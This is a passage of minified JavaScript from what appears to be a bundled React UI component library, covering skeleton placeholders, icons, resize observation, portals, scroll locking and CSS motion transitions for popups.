li:last-child:not(:first-child):not(:nth-child(2))`]:{width:"61%"}},[`&-round ${t}-section`]:{[`${n}, ${o} > li`]:{borderRadius:g}}},[`${t}-with-avatar ${t}-section`]:{[n]:{marginBlockStart:f,[`+ ${o}`]:{marginBlockStart:S}}},[`${t}${t}-element`]:{display:"inline-block",width:"auto",...(e=>{let{borderRadiusSM:t,skeletonButtonCls:r,controlHeight:n,controlHeightLG:o,controlHeightSM:a,gradientFromColor:i,calc:s}=e;return{[r]:{display:"inline-block",verticalAlign:"top",background:i,borderRadius:t,width:s(n).mul(2).equal(),minWidth:s(n).mul(2).equal(),...al(n,s)},...as(e,n,r),[`${r}-lg`]:{...al(o,s)},...as(e,o,`${r}-lg`),[`${r}-sm`]:{...al(a,s)},...as(e,a,`${r}-sm`)}})(e),...(e=>{let{skeletonAvatarCls:t,gradientFromColor:r,controlHeight:n,controlHeightLG:o,controlHeightSM:a}=e;return{[t]:{display:"inline-block",verticalAlign:"top",background:r,...ao(n)},[`${t}${t}-circle`]:{borderRadius:"50%"},[`${t}${t}-lg`]:{...ao(o)},[`${t}${t}-sm`]:{...ao(a)}}})(e),...(e=>{let{controlHeight:t,borderRadiusSM:r,skeletonInputCls:n,controlHeightLG:o,controlHeightSM:a,gradientFromColor:i,calc:s}=e;return{[n]:{display:"inline-block",verticalAlign:"top",background:i,borderRadius:r,...aa(t,s)},[`${n}-lg`]:{...aa(o,s)},[`${n}-sm`]:{...aa(a,s)}}})(e),...{[e.skeletonNodeCls]:{...ai(e)}},...(e=>{let{skeletonImageCls:t,imageSizeBase:r,calc:n}=e;return{[t]:{...ai(e),[`${t}-path`]:{fill:"#bfbfbf"},[`${t}-svg`]:{...ao(r),maxWidth:n(r).mul(4).equal(),maxHeight:n(r).mul(4).equal()},[`${t}-svg${t}-svg-circle`]:{borderRadius:"50%"}},[`${t}${t}-circle`]:{borderRadius:"50%"}}})(e)},[`${t}${t}-block`]:{width:"100%",[a]:{width:"100%"},[i]:{width:"100%"}},[`${t}${t}-active`]:{[`
        ${n},
        ${o} > li,
        ${r},
        ${a},
        ${i},
        ${s},
        ${l}
      `]:{...{background:e.skeletonLoadingBackground,backgroundSize:"400% 100%",animationName:ar,animationDuration:e.skeletonLoadingMotionDuration,animationTimingFunction:"ease",animationIterationCount:"infinite"}}}}})(r8(e,{skeletonAvatarCls:`${t}-avatar`,skeletonTitleCls:`${t}-title`,skeletonParagraphCls:`${t}-paragraph`,skeletonButtonCls:`${t}-button`,skeletonInputCls:`${t}-input`,skeletonNodeCls:`${t}-node`,skeletonImageCls:`${t}-image`,imageSizeBase:r(e.controlHeight).mul(1.5).equal(),borderRadius:100,skeletonLoadingBackground:`linear-gradient(90deg, ${e.gradientFromColor} 25%, ${e.gradientToColor} 37%, ${e.gradientFromColor} 63%)`,skeletonLoadingMotionDuration:"1.4s"}))},e=>{let{colorFillContent:t,colorFill:r}=e;return{color:t,colorGradientEnd:r,gradientFromColor:t,gradientToColor:r,titleHeight:e.controlHeight/2,blockRadius:e.borderRadiusSM,paragraphMarginTop:e.marginLG+e.marginXXS,paragraphLiHeight:e.controlHeight/2}},{deprecatedTokens:[["color","gradientFromColor"],["colorGradientEnd","gradientToColor"]]}),au=e=>{let{prefixCls:t,className:r,classNames:n,rootClassName:o,internalClassName:a,style:i,styles:s,active:l,children:c}=e,{getPrefixCls:u}=b.useContext(ee),d=u("skeleton",t),[p,m]=ac(d),f=K(d,`${d}-element`,{[`${d}-active`]:l},p,n?.root,r,o,m);return b.createElement("div",{className:f,style:s?.root},b.createElement("div",{className:K(n?.content,a||`${d}-node`),style:{...s?.content,...i}},c))},ad=e=>{let{prefixCls:t,className:r,style:n,rows:o=0}=e,a=Array.from({length:o}).map((t,r)=>b.createElement("li",{key:r,style:{width:((e,t)=>{let{width:r,rows:n=2}=t;return Array.isArray(r)?r[e]:n-1===e?r:void 0})(r,e)}}));return b.createElement("ul",{className:K(t,r),style:n},a)},ap=({prefixCls:e,className:t,width:r,style:n})=>b.createElement("h3",{className:K(e,t),style:{width:r,...n}});function am(e){return e&&"object"==typeof e?e:{}}let af=e=>{let{prefixCls:t,loading:r,className:n,rootClassName:o,classNames:a,style:i,styles:s,children:l,avatar:c=!1,title:u=!0,paragraph:d=!0,active:p,round:m}=e,{getPrefixCls:f,direction:g,className:h,style:y,classNames:v,styles:S}=en("skeleton"),x=f("skeleton",t),[C,w]=ac(x),[k,$]=n2([v,a],[S,s],{props:{...e,avatar:c,title:u,paragraph:d}});if(r||!("loading"in e)){let e,t,r=!!c,a=!!u,s=!!d;if(r){let t={className:k.avatar,prefixCls:`${x}-avatar`,...a&&!s?{size:"large",shape:"square"}:{size:"large",shape:"circle"},...am(c),style:$.avatar};e=b.createElement("div",{className:K(k.header,`${x}-header`),style:$.header},b.createElement(at,{...t}))}if(a||s){let e,n;if(a){let t={className:k.title,prefixCls:`${x}-title`,...!r&&s?{width:"38%"}:r&&s?{width:"50%"}:{},...am(u),style:$.title};e=b.createElement(ap,{...t})}if(s){let e,t={className:k.paragraph,prefixCls:`${x}-paragraph`,...(e={},(!r||!a)&&(e.width="61%"),!r&&a?e.rows=3:e.rows=2,e),...am(d),style:$.paragraph};n=b.createElement(ad,{...t})}t=b.createElement("div",{className:K(k.section,`${x}-section`),style:$.section},e,n)}let l=K(x,{[`${x}-with-avatar`]:r,[`${x}-active`]:p,[`${x}-rtl`]:"rtl"===g,[`${x}-round`]:m},k.root,h,n,o,C,w);return b.createElement("div",{className:l,style:{...$.root,...y,...i}},e,t)}return l??null};af.Button=e=>{let{prefixCls:t,className:r,rootClassName:n,classNames:o,active:a,style:i,styles:s,block:l=!1,size:c,...u}=e,{getPrefixCls:d}=b.useContext(ee),p=d("skeleton",t),[m,f]=ac(p),g=n6(e=>c??e),h=K(p,`${p}-element`,{[`${p}-active`]:a,[`${p}-block`]:l},o?.root,r,n,m,f);return b.createElement("div",{className:h,style:s?.root},b.createElement(at,{prefixCls:`${p}-button`,className:o?.content,style:{...s?.content,...i},size:g,...u}))},af.Avatar=e=>{let{prefixCls:t,className:r,classNames:n,rootClassName:o,active:a,style:i,styles:s,shape:l="circle",size:c,...u}=e,{getPrefixCls:d}=b.useContext(ee),p=d("skeleton",t),[m,f]=ac(p),g=n6(e=>c??e),h=K(p,`${p}-element`,{[`${p}-active`]:a},n?.root,r,o,m,f);return b.createElement("div",{className:h,style:s?.root},b.createElement(at,{prefixCls:`${p}-avatar`,className:n?.content,style:{...s?.content,...i},shape:l,size:g,...u}))},af.Input=e=>{let{prefixCls:t,className:r,classNames:n,rootClassName:o,active:a,block:i,style:s,styles:l,size:c,...u}=e,{getPrefixCls:d}=b.useContext(ee),p=d("skeleton",t),[m,f]=ac(p),g=n6(e=>c??e),h=K(p,`${p}-element`,{[`${p}-active`]:a,[`${p}-block`]:i},n?.root,r,o,m,f);return b.createElement("div",{className:h,style:l?.root},b.createElement(at,{prefixCls:`${p}-input`,className:n?.content,style:{...l?.content,...s},size:g,...u}))},af.Image=e=>{let{getPrefixCls:t}=b.useContext(ee),r=t("skeleton",e.prefixCls);return b.createElement(au,{...e,internalClassName:`${r}-image`},b.createElement("svg",{viewBox:"0 0 1098 1024",xmlns:"http://www.w3.org/2000/svg",className:`${r}-image-svg`},b.createElement("title",null,"Image placeholder"),b.createElement("path",{d:"M365.7 329.1q0 45.8-32 77.7t-77.7 32-77.7-32-32-77.7 32-77.6 77.7-32 77.7 32 32 77.6M951 548.6v256H146.3V694.9L329 512l91.5 91.4L713 311zm54.8-402.3H91.4q-7.4 0-12.8 5.4T73 164.6v694.8q0 7.5 5.5 12.9t12.8 5.4h914.3q7.5 0 12.9-5.4t5.4-12.9V164.6q0-7.5-5.4-12.9t-12.9-5.4m91.4 18.3v694.8q0 37.8-26.8 64.6t-64.6 26.9H91.4q-37.7 0-64.6-26.9T0 859.4V164.6q0-37.8 26.8-64.6T91.4 73h914.3q37.8 0 64.6 26.9t26.8 64.6",className:`${r}-image-path`})))},af.Node=au;let ag={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z"}}]},name:"close",theme:"outlined"};function ah(){return(ah=Object.assign.bind()).apply(this,arguments)}let ab=b.forwardRef((e,t)=>b.createElement(tr,ah({},e,{ref:t,icon:ag})));e.s(["default",0,ab],64517);let ay={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M176 511a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0z"}}]},name:"ellipsis",theme:"outlined"};function av(){return(av=Object.assign.bind()).apply(this,arguments)}let aS=b.forwardRef((e,t)=>b.createElement(tr,av({},e,{ref:t,icon:ay})));e.s(["default",0,aS],67384);let ax={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M482 152h60q8 0 8 8v704q0 8-8 8h-60q-8 0-8-8V160q0-8 8-8z"}},{tag:"path",attrs:{d:"M192 474h672q8 0 8 8v60q0 8-8 8H160q-8 0-8-8v-60q0-8 8-8z"}}]},name:"plus",theme:"outlined"};function aC(){return(aC=Object.assign.bind()).apply(this,arguments)}let aw=b.forwardRef((e,t)=>b.createElement(tr,aC({},e,{ref:t,icon:ax})));var ak=e.i(6584);let a$=(0,b.createContext)(null);function aE(e){return e instanceof HTMLElement||e instanceof SVGElement}function aP(e){return e&&"object"==typeof e&&aE(e.nativeElement)?e.nativeElement:aE(e)?e:null}let aT=b.createContext(null),aI=new Map;function aM(e){e.forEach(e=>{let{target:t}=e;aI.get(t)?.forEach(e=>e(t))})}function aR(){return n||(n=new ResizeObserver(aM)),n}function aA(e,t,r,n){let o=b.useRef({width:-1,height:-1,offsetWidth:-1,offsetHeight:-1}),a=y(e=>{let{width:t,height:a}=e.getBoundingClientRect(),{offsetWidth:i,offsetHeight:s}=e,l=Math.floor(t),c=Math.floor(a);if(o.current.width!==l||o.current.height!==c||o.current.offsetWidth!==i||o.current.offsetHeight!==s){let u={width:l,height:c,offsetWidth:i,offsetHeight:s};o.current=u;let d=i===Math.round(t)?t:i,p=s===Math.round(a)?a:s,m={...u,offsetWidth:d,offsetHeight:p};n?.(m,e),Promise.resolve().then(()=>{r?.(m,e)})}}),i="function"==typeof t;b.useEffect(()=>{let r=i?t():t;return r&&e&&(aI.has(r)||(aI.set(r,new Set),aR().observe(r)),aI.get(r).add(a)),()=>{r&&aI.has(r)&&(aI.get(r).delete(a),aI.get(r).size||(aR().unobserve(r),aI.delete(r)))}},[e,i?0:t])}let aD=b.forwardRef(function(e,t){let{children:r,disabled:n,onResize:o,data:a}=e,i=b.useRef(null),s=b.useContext(aT),l="function"==typeof r,c=l?r(i):r,u=!l&&b.isValidElement(c)&&D(c),d=A(u?_(c):null,i),p=()=>aP(i.current);return b.useImperativeHandle(t,()=>p()),aA(!n,p,o,(e,t)=>{s?.(e,t,a)}),u?b.cloneElement(c,{ref:d}):c});function aL(){return(aL=Object.assign.bind()).apply(this,arguments)}let a_=b.forwardRef(function(e,t){let{children:r}=e;return("function"==typeof r?[r]:X(r)).map((r,n)=>{let o=r?.key||`rc-observer-key-${n}`;return b.createElement(aD,aL({},e,{key:o,ref:0===n?t:void 0}),r)})});a_.Collection=function({children:e,onBatchResize:t}){let r=b.useRef(0),n=b.useRef([]),o=b.useContext(aT),a=b.useCallback((e,a,i)=>{r.current+=1;let s=r.current;n.current.push({size:e,element:a,data:i}),Promise.resolve().then(()=>{s===r.current&&(t?.(n.current),n.current=[])}),o?.(e,a,i)},[t,o]);return b.createElement(aT.Provider,{value:a},e)},e.s(["default",0,a_],78052);let aO={width:0,height:0,left:0,top:0};function aN(e,t){let r=b.useRef(e),[,n]=b.useState({});return[r.current,function(e){let o="function"==typeof e?e(r.current):e;o!==r.current&&t(o,r.current),r.current=o,n({})}]}function aF(e){let[t,r]=(0,b.useState)(0),n=(0,b.useRef)(0),o=(0,b.useRef)();return o.current=e,C(()=>{o.current?.()},[t]),()=>{n.current===t&&(n.current+=1,r(n.current))}}let aj={width:0,height:0,left:0,top:0,right:0};function aH(e){let t;return e instanceof Map?(t={},e.forEach((e,r)=>{t[r]=e})):t=e,JSON.stringify(t)}function aB(e){return String(e).replace(/"/g,"TABS_DQ")}function az(e,t,r,n){return!!r&&!n&&!1!==e&&(void 0!==e||!1!==t&&null!==t)}let aV=b.forwardRef((e,t)=>{let{prefixCls:r,editable:n,locale:o,style:a}=e;return n&&!1!==n.showAdd?b.createElement("button",{ref:t,type:"button",className:`${r}-nav-add`,style:a,"aria-label":o?.addAriaLabel||"Add tab",onClick:e=>{n.onEdit("add",{event:e})}},n.addIcon||"+"):null}),aW=b.forwardRef((e,t)=>{let r,{position:n,prefixCls:o,extra:a}=e;if(!a)return null;let i={};return"object"!=typeof a||b.isValidElement(a)?i.right=a:i=a,"right"===n&&(r=i.right),"left"===n&&(r=i.left),r?b.createElement("div",{className:`${o}-extra-content`,ref:t},r):null});var aU=e.i(74080);let aq=b.createContext(null),aG=[],aJ=`rc-util-locker-${Date.now()}`,aX=0,aK=0,aQ={...b}.useId,aY=aQ?function(e){let t=aQ();return e||t}:function(e){let[t,r]=b.useState("ssr-id");return(b.useEffect(()=>{let e=aK;aK+=1,r(`rc_unique_${e}`)},[]),e)?e:t};e.s(["default",0,aY],87225);let aZ=[],a0=0,a1=e=>{if("Escape"===e.key&&!e.isComposing){if(Date.now()-a0<200)return;let t=aZ.length;for(let r=t-1;r>=0;r-=1)aZ[r].onEsc({top:r===t-1,event:e})}},a2=()=>{a0=Date.now()},a3=e=>!1!==e&&(v()&&e?"string"==typeof e?document.querySelector(e):"function"==typeof e?e():e:null),a6=b.forwardRef((e,t)=>{let r,n,o,a,{open:i,autoLock:s,getContainer:l,debug:c,autoDestroy:u=!0,children:d,onEsc:p}=e,[m,f]=b.useState(i),g=m||i;b.useEffect(()=>{(u||i)&&f(i)},[i,u]);let[h,S]=b.useState(()=>a3(l));b.useEffect(()=>{let e=a3(l);S(()=>e??null)});let[C,w]=function(e,t){let[r]=b.useState(()=>v()?document.createElement("div"):null),n=b.useRef(!1),o=b.useContext(aq),[a,i]=b.useState(aG),s=o||(n.current?void 0:e=>{i(t=>[e,...t])});function l(){r.parentElement||document.body.appendChild(r),n.current=!0}function c(){r.parentElement?.removeChild(r),n.current=!1}return x(()=>(e?o?o(l):l():c(),c),[e]),x(()=>{a.length&&(a.forEach(e=>e()),i(aG))},[a]),[r,s]}(g&&!h,0),k=h??C;!function(e){let t=!!e,[r]=b.useState(()=>(aX+=1,`${aJ}_${aX}`));x(()=>{if(t){var e;let t=(e=document.body,"u"<typeof document||!e||!(e instanceof Element)?{width:0,height:0}:function(e){let t,r,n=`rc-scrollbar-measure-${Math.random().toString(36).substring(7)}`,o=document.createElement("div");o.id=n;let a=o.style;if(a.position="absolute",a.left="0",a.top="0",a.width="100px",a.height="100px",a.overflow="scroll",e){let o=getComputedStyle(e);a.scrollbarColor=o.scrollbarColor,a.scrollbarWidth=o.scrollbarWidth;let i=getComputedStyle(e,"::-webkit-scrollbar"),s=parseInt(i.width,10),l=parseInt(i.height,10);try{let e=s?`width: ${i.width};`:"",t=l?`height: ${i.height};`:"";e1(`
#${n}::-webkit-scrollbar {
${e}
${t}
}`,n)}catch(e){console.error(e),t=s,r=l}}document.body.appendChild(o);let i=e&&t&&!isNaN(t)?t:o.offsetWidth-o.clientWidth,s=e&&r&&!isNaN(r)?r:o.offsetHeight-o.clientHeight;return document.body.removeChild(o),e0(n),{width:i,height:s}}(e)).width,n=document.body.scrollHeight>(window.innerHeight||document.documentElement.clientHeight)&&window.innerWidth>document.body.offsetWidth;e1(`
html body {
  overflow-y: hidden;
  ${n?`width: calc(100% - ${t}px);`:""}
}`,r)}else e0(r);return()=>{e0(r)}},[t,r])}(s&&i&&v()&&(k===C||k===document.body)),r=aY(),n=y(p),o=()=>{aZ.find(e=>e.id===r)||aZ.push({id:r,onEsc:n})},a=()=>{aZ=aZ.filter(e=>e.id!==r)},(0,b.useMemo)(()=>{i?o():i||a()},[i]),(0,b.useEffect)(()=>{if(i)return o(),window.addEventListener("keydown",a1),window.addEventListener("compositionend",a2),()=>{a(),0===aZ.length&&(window.removeEventListener("keydown",a1),window.removeEventListener("compositionend",a2))}},[i]);let $=null;d&&D(d)&&t&&($=_(d));let E=A($,t);if(!g||!v()||void 0===h)return null;let P=!1===k,T=d;return t&&(T=b.cloneElement(d,{ref:E})),b.createElement(aq.Provider,{value:w},P?T:(0,aU.createPortal)(T,k))}),a4=b.createContext({});e.s(["Context",0,a4,"default",0,e=>{let{children:t,...r}=e,n=b.useMemo(()=>({motion:r.motion}),[r.motion]);return b.createElement(a4.Provider,{value:n},t)}],49468);let a5=function(e){let[,t]=b.useReducer(e=>e+1,0),r=b.useRef(e);return[y(()=>r.current),y(e=>{r.current="function"==typeof e?e(r.current):e,t()})]},a8="none",a7="appear",a9="enter",ie="leave",it="none",ir="prepare",io="start",ia="active",ii="prepared";function is(e,t){let r={};return r[e.toLowerCase()]=t.toLowerCase(),r[`Webkit${e}`]=`webkit${t}`,r[`Moz${e}`]=`moz${t}`,r[`ms${e}`]=`MS${t}`,r[`O${e}`]=`o${t.toLowerCase()}`,r}let il=(m=v(),f="u">typeof window?window:{},s={animationend:is("Animation","AnimationEnd"),transitionend:is("Transition","TransitionEnd")},m&&("AnimationEvent"in f||delete s.animationend.animation,"TransitionEvent"in f||delete s.transitionend.transition),s),ic={};v()&&({style:ic}=document.createElement("div"));let iu={};function id(e){if(iu[e])return iu[e];let t=il[e];if(t){let r=Object.keys(t),n=r.length;for(let o=0;o<n;o+=1){let n=r[o];if(Object.prototype.hasOwnProperty.call(t,n)&&n in ic)return iu[e]=t[n],iu[e]}}return""}let ip=id("animationend"),im=id("transitionend"),ig=ip||"animationend",ih=im||"transitionend";function ib(e,t){return e?"object"==typeof e?e[t.replace(/-\w/g,e=>e[1].toUpperCase())]:`${e}-${t}`:null}let iy=v()?b.useLayoutEffect:b.useEffect,iv=[ir,io,ia,"end"],iS=[ir,ii];function ix(e){return e===ia||"end"===e}let iC=(l=g=!!(ip&&im),"object"==typeof g&&({transitionSupport:l}=g),(c=b.forwardRef((e,t)=>{let{visible:r=!0,removeOnLeave:n=!0,forceRender:o,children:a,motionName:i,leavedClassName:s,eventProps:c}=e,{motion:u}=b.useContext(a4),d=!!(e.motionName&&l&&!1!==u),p=(0,b.useRef)();function m(){return aP(p.current)}let[f,g,h,v,S]=function(e,t,r,{motionEnter:n=!0,motionAppear:o=!0,motionLeave:a=!0,motionDeadline:i,motionLeaveImmediately:s,onAppearPrepare:l,onEnterPrepare:c,onLeavePrepare:u,onAppearStart:d,onEnterStart:p,onLeaveStart:m,onAppearActive:f,onEnterActive:g,onLeaveActive:h,onAppearEnd:v,onEnterEnd:S,onLeaveEnd:x,onVisibleChanged:C}){let[w,k]=b.useState(),[$,E]=a5(a8),[P,T]=b.useState([null,null]),I=$(),M=(0,b.useRef)(!1),R=(0,b.useRef)(null),A=(0,b.useRef)(!1);function D(){E(a8),T([null,null])}let L=y(e=>{let t,n=$();if(n===a8)return;let o=r();if(e&&!e.deadline&&e.target!==o)return;let a=A.current;n===a7&&a?t=v?.(o,e):n===a9&&a?t=S?.(o,e):n===ie&&a&&(t=x?.(o,e)),a&&!1!==t&&D()}),[_]=(e=>{let t=(0,b.useRef)();function r(t){t&&(t.removeEventListener(ih,e),t.removeEventListener(ig,e))}return b.useEffect(()=>()=>{r(t.current),t.current=null},[]),[function(n){t.current&&t.current!==n&&r(t.current),n&&n!==t.current&&(n.addEventListener(ih,e),n.addEventListener(ig,e),t.current=n)},r]})(L),O=e=>{switch(e){case a7:return{[ir]:l,[io]:d,[ia]:f};case a9:return{[ir]:c,[io]:p,[ia]:g};case ie:return{[ir]:u,[io]:m,[ia]:h};default:return{}}},N=b.useMemo(()=>O(I),[I]),[F,j]=((e,t,r)=>{let[n,o]=(e=>{let t=b.useRef(!1),[r,n]=b.useState(e);return b.useEffect(()=>(t.current=!1,()=>{t.current=!0}),[]),[r,function(e,r){r&&t.current||n(e)}]})(it),[a,i]=(()=>{let e=b.useRef(null);function t(){oU.cancel(e.current)}return b.useEffect(()=>()=>{t()},[]),[function r(n,o=2){t();let a=oU(()=>{o<=1?n({isCanceled:()=>a!==e.current}):r(n,o-1)});e.current=a},t]})(),s=t?iS:iv;return iy(()=>{if(n!==it&&"end"!==n){let e=s.indexOf(n),t=s[e+1],i=r(n);!1===i?o(t,!0):t&&a(e=>{function r(){e.isCanceled()||o(t,!0)}!0===i?r():Promise.resolve(i).then(r)})}},[e,n]),b.useEffect(()=>()=>{i()},[]),[function(){o(ir,!0)},n]})(I,!e,e=>{if(e===ir){let e=N[ir];return!!e&&e(r())}return e in N&&T([N[e]?.(r(),null)||null,e]),e===ia&&I!==a8&&(_(r()),i>0&&(clearTimeout(R.current),R.current=setTimeout(()=>{L({deadline:!0})},i))),e===ii&&D(),!0});A.current=ix(j);let H=(0,b.useRef)(null);iy(()=>{let r;if(M.current&&H.current===t)return;k(t);let i=M.current;M.current=!0,!i&&t&&o&&(r=a7),i&&t&&n&&(r=a9),(i&&!t&&a||!i&&s&&!t&&a)&&(r=ie);let l=O(r);r&&(e||l[ir])?(E(r),F()):E(a8),H.current=t},[t]),(0,b.useEffect)(()=>{(I!==a7||o)&&(I!==a9||n)&&(I!==ie||a)||E(a8)},[o,n,a]),(0,b.useEffect)(()=>()=>{M.current=!1,clearTimeout(R.current)},[]);let B=b.useRef(!1);(0,b.useEffect)(()=>{w&&(B.current=!0),void 0!==w&&I===a8&&((B.current||w)&&C?.(w),B.current=!0)},[w,I]);let z=P[0];N[ir]&&j===io&&(z={transition:"none",...z});let V=P[1];return[$,j,z,w??t,!M.current&&I===a8&&e&&o?"NONE":j!==io&&j!==ia||V===j]}(d,r,m,e),x=f(),C=b.useRef(v);v&&(C.current=!0);let w=b.useMemo(()=>{let e={};return Object.defineProperties(e,{nativeElement:{enumerable:!0,get:m},inMotion:{enumerable:!0,get:()=>()=>f()!==a8},enableMotion:{enumerable:!0,get:()=>()=>d}}),e},[]);b.useImperativeHandle(t,()=>w,[]);let k=b.useRef(0);return S&&(k.current+=1),b.useMemo(()=>{let e;if("NONE"===S)return null;let t={...c,visible:r};if(a)if(x===a8)e=v?a({...t},p):!n&&C.current&&s?a({...t,className:s},p):!o&&(n||s)?null:a({...t,style:{display:"none"}},p);else{let r;g===ir?r="prepare":ix(g)?r="active":g===io&&(r="start");let n=ib(i,`${x}-${r}`);e=a({...t,className:K(ib(i,x),{[n]:n&&r,[i]:"string"==typeof i}),style:h},p)}else e=null;return b.isValidElement(e)&&D(e)&&(_(e)||(e=b.cloneElement(e,{ref:p}))),e},[k.current])})).displayName="CSSMotion",c);var iw=b;let ik="keep",i$="remove",iE="removed";function iP(e){let t;return{...t=e&&"object"==typeof e&&"key"in e?e:{key:e},key:String(t.key)}}function iT(e=[]){return e.map(iP)}function iI(){return(iI=Object.assign.bind()).apply(this,arguments)}let iM=["eventProps","visible","children","motionName","motionAppear","motionEnter","motionLeave","motionLeaveImmediately","motionDeadline","removeOnLeave","leavedClassName","onAppearPrepare","onAppearStart","onAppearActive","onAppearEnd","onEnterStart","onEnterActive","onEnterEnd","onLeaveStart","onLeaveActive","onLeaveEnd"];function iR(e){let{prefixCls:t,align:r,arrow:n,arrowPos:o}=e,{className:a,content:i,style:s}=n||{},{x:l=0,y:c=0}=o,u=b.useRef(null);if(!r||!r.points)return null;let d={position:"absolute"};if(!1!==r.autoArrow){let e=r.points[0],t=r.points[1],n=e[0],o=e[1],a=t[0],i=t[1];n!==a&&["t","b"].includes(n)?"t"===n?d.top=0:d.bottom=0:d.top=c,o!==i&&["l","r"].includes(o)?"l"===o?d.left=0:d.right=0:d.left=l}return b.createElement("div",{ref:u,className:K(`${t}-arrow`,a),style:{...d,...s}},i)}function iA(){return(iA=Object.assign.bind()).apply(this,arguments)}function iD(e){let{prefixCls:t,open:r,zIndex:n,mask:o,motion:a,mobile:i}=e;return o?b.createElement(iC,iA({},a,{motionAppear:!0,visible:r,removeOnLeave:!0}),({className:e})=>b.createElement("div",{style:{zIndex:n},className:K(`${t}-mask`,i&&`${t}-mobile-mask`,e)})):null}!function(e,t=iC){class r extends iw.Component{static defaultProps={component:"div"};state={keyEntities:[]};static getDerivedStateFromProps({keys:e},{keyEntities:t}){return{keyEntities:(function(e=[],t=[]){let r=[],n=0,o=t.length,a=iT(e),i=iT(t);a.forEach(e=>{let t=!1;for(let a=n;a<o;a+=1){let o=i[a];if(o.key===e.key){n<a&&(r=r.concat(i.slice(n,a).map(e=>({...e,status:"add"}))),n=a),r.push({...o,status:ik}),n+=1,t=!0;break}}t||r.push({...e,status:i$})}),n<o&&(r=r.concat(i.slice(n).map(e=>({...e,status:"add"}))));let s={};return r.forEach(({key:e})=>{s[e]=(s[e]||0)+1}),Object.keys(s).filter(e=>s[e]>1).forEach(e=>{(r=r.filter(({key:t,status:r})=>t!==e||r!==i$)).forEach(t=>{t.key===e&&(t.status=ik)})}),r})(t,iT(e)).filter(e=>{let r=t.find(({key:t})=>e.key===t);return!r||r.status!==iE||e.status!==i$})}}removeKey=e=>{this.setState(t=>({keyEntities:t.keyEntities.map(t=>t.key!==e?t:{...t,status:iE})}),()=>{let{keyEntities:e}=this.state;0===e.filter(({status:e})=>e!==iE).length&&this.props.onAllRemoved&&this.props.onAllRemoved()})};render(){let{keyEntities:e}=this.state,{component:r,children:n,onVisibleChanged:o,onAllRemoved:a,...i}=this.props,s=r||iw.Fragment,l={};return iM.forEach(e=>{l[e]=i[e],delete i[e]}),delete i.keys,iw.createElement(s,i,e.map(({status:e,...r},a)=>iw.createElement(t,iI({},l,{key:r.key,visible:"add"===e||e===ik,eventProps:r,onVisibleChanged:e=>{o?.(e,{key:r.key}),e||this.removeKey(r.key)}}),(e,t)=>n({...e,index:a},t))))}}}(0),e.s(["default",0,iC],28473);let iL=b.memo(({children:e})=>e,(e,t)=>t.cache);function i_(e,t,r,n,o,a,i,s){let l="auto",c=e?{}:{left:"-1000vw",top:"-1000vh",right:l,bottom:l};if(!e&&(t||!r)){let{points:e}=n,t=n.dynamicInset||n._experimental?.dynamicInset,r=t&&"r"===e[0][1],u=t&&"b"===e[0][0];r?(c.right=o,c.left=l):(c.left=i,c.right=l),u?(c.bottom=a,c.top=l):(c.top=s,c.bottom=l)}return c}function iO(){return(iO=Object.assign.bind()).apply(this,arguments)}let iN=b.forwardRef((e,t)=>{let{onEsc:r,popup:n,className:o,prefixCls:a,style:i,target:s,onVisibleChanged:l,open:c,keepDom:u,fresh:d,onClick:p,mask:m,arrow:f,arrowPos:g,align:h,motion:v,maskMotion:S,mobile:C,forceRender:w,getPopupContainer:k,autoDestroy:$,portal:E,children:P,zIndex:T,onMouseEnter:I,onMouseLeave:M,onPointerEnter:A,onPointerDownCapture:D,ready:L,offsetX:_,offsetY:O,offsetR:N,offsetB:F,onAlign:j,onPrepare:H,onResize:B,stretch:z,targetWidth:V,targetHeight:W}=e,U="function"==typeof n?n():n,q=c||u,G=!!C,[J,X,Q]=b.useMemo(()=>C?[C.mask,C.maskMotion,C.motion]:[m,S,v],[C,m,S,v]),Y=k?.length>0,[Z,ee]=b.useState(!k||!Y);x(()=>{!Z&&Y&&s&&ee(!0)},[Z,Y,s]);let et=y((e,t)=>{B?.(e,t),j()}),er=i_(G,L,c,h,N,F,_,O);if(!Z)return null;let en={};return z&&(z.includes("height")&&W?en.height=W:z.includes("minHeight")&&W&&(en.minHeight=W),z.includes("width")&&V?en.width=V:z.includes("minWidth")&&V&&(en.minWidth=V)),c||(en.pointerEvents="none"),b.createElement(E,{open:w||q,getContainer:k&&(()=>k(s)),autoDestroy:$,onEsc:r},b.createElement(iD,{prefixCls:a,open:c,zIndex:T,mask:J,motion:X,mobile:G}),b.createElement(a_,{onResize:et,disabled:!c},e=>b.createElement(iC,iO({motionAppear:!0,motionEnter:!0,motionLeave:!0,removeOnLeave:!1,forceRender:w,leavedClassName:`${a}-hidden`},Q,{onAppearPrepare:H,onEnterPrepare:H,visible:c,onVisibleChanged:e=>{v?.onVisibleChanged?.(e),l(e)}}),({className:r,style:n},s)=>{let l=K(a,r,o,{[`${a}-mobile`]:G});return 